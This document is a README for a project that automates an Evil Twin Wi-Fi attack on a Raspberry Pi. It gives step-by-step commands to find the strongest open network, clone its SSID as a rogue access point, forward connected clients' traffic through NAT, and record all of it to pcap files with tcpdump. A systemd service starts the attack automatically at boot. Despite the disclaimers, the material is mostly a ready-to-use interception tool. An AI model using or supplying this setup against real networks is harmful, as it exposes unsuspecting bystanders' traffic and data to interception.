# Evil Twin Wi-Fi Automation (Raspberry Pi Zero 2 W)

## **Overview**

This project automates the process of setting up an **Evil Twin Wi-Fi attack** using a **Raspberry Pi Zero 2 W**. The script:

1. **Scans for open Wi-Fi networks** using `iwlist` (as NetworkManager is disabled).
2. **Connects to the strongest open Wi-Fi** using `wpa_supplicant`.
3. **Clones the SSID and starts an Evil Twin AP** using `hostapd` and `dnsmasq`.
4. **Enables NAT & packet forwarding** to route Evil Twin traffic through the real network.
5. **Logs captured network traffic** using `tcpdump` for later analysis.
6. **Runs automatically on boot** using `systemd`.

**Designed for authorized security research & penetration testing only!**

---

## **⚠️ Legal Disclaimer**

This tool is for **educational and authorized testing purposes only**. Unauthorized interception of network traffic is **illegal** in many jurisdictions. Only use this on **networks you own or have explicit permission to test**.

---

## **Hardware & Software Requirements**

### **🔹 Hardware**

- **Raspberry Pi Zero 2 W** (or any Raspberry Pi with Wi-Fi capability)
- **USB Wi-Fi adapter** (Recommended: for separate AP & STA interfaces)
- **MicroSD Card** (Minimum 8GB recommended)
- **Power supply** (5V, 2A recommended)

### **🔹 Software**

- **Operating System**: Raspberry Pi OS (Debian-based)
- **Disabled**: `NetworkManager` (uses `dhcpcd` for networking)
- **Installed Tools**:
  - `hostapd` (Creates the Evil Twin AP)
  - `dnsmasq` (Handles DHCP for the AP clients)
  - `iwlist` (Scans for networks without `nmcli`)
  - `tcpdump` (Captures traffic from connected clients)

---

## **Installation & Setup**

### **1️⃣ Install Dependencies**

First, update the system and install required tools:

```bash
sudo apt-get update && sudo apt-get upgrade -y
sudo apt-get install -y hostapd dnsmasq iw wpa_supplicant iptables tcpdump
```

### **2️⃣ Clone the Repository**

```bash
git clone https://github.com/YourUsername/EvilTwinPi.git
cd EvilTwinPi
```

### **3️⃣ Enable Systemd Service**

To ensure the script runs automatically at boot:

```bash
sudo cp systemd/evil_twin.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable evil_twin.service
sudo systemctl start evil_twin.service
```

### **4️⃣ Ensure SSH Access**

If you want to SSH into the Pi remotely:

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

If your Pi is running as an AP, you can connect to its Wi-Fi and SSH into `192.168.50.1`.

---

## **How It Works**

### **1. Scanning for Open Wi-Fi Networks**

The script uses `iwlist` to scan for available open networks:

```bash
sudo iwlist wlan0 scan | grep -E 'ESSID|Encryption|Quality'
```

- Filters **unencrypted** (`Encryption key:off`) networks
- Selects the **strongest signal** network

### **2. Connecting to Open Wi-Fi**

Once an open network is found, it uses `wpa_supplicant` to connect:

```bash
sudo wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
sudo dhclient wlan0  # Get an IP address
```

### **3. Setting Up the Evil Twin AP**

- Writes a **custom `hostapd.conf`** to clone the SSID
- Starts `hostapd` to **broadcast the Evil Twin**
- Configures `dnsmasq` for **DHCP services**

### **4. Enabling NAT & Packet Forwarding**

```bash
sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan1 -o wlan0 -j ACCEPT
```

### **5. Logging Captured Traffic**

- Captures **all packets** on the Evil Twin AP interface (`wlan1`)
- Saves `.pcap` files to `/var/log/evil_twin/`
- Runs in the background automatically:

```bash
sudo tcpdump -i wlan1 -w /var/log/evil_twin/capture_$(date +%Y%m%d_%H%M%S).pcap
```

---

## **Monitoring & Log Access**

### **1️⃣ Checking Logs in Real-Time**

```bash
tail -f /var/log/evil_twin/main.log
```

### **2️⃣ Viewing Captured Traffic**

If SSH’d in, analyze the `.pcap` logs with:

```bash
sudo tcpdump -r /var/log/evil_twin/capture_YYYYMMDD_HHMMSS.pcap
```

Or transfer files for deeper analysis in **Wireshark**:

```bash
scp pi@192.168.50.1:/var/log/evil_twin/*.pcap ~/local_folder/
```

### **3️⃣ Restarting Evil Twin Service**

If something fails, restart the service:

```bash
sudo systemctl restart evil_twin.service
```

---

## **Final Notes**

- **Be responsible** and use this for **ethical testing only**.
- **Test in a lab environment** before field use.
- **Secure your own network** by using WPA2/3 encryption to prevent similar attacks.

  **Stay safe and hack responsibly!**
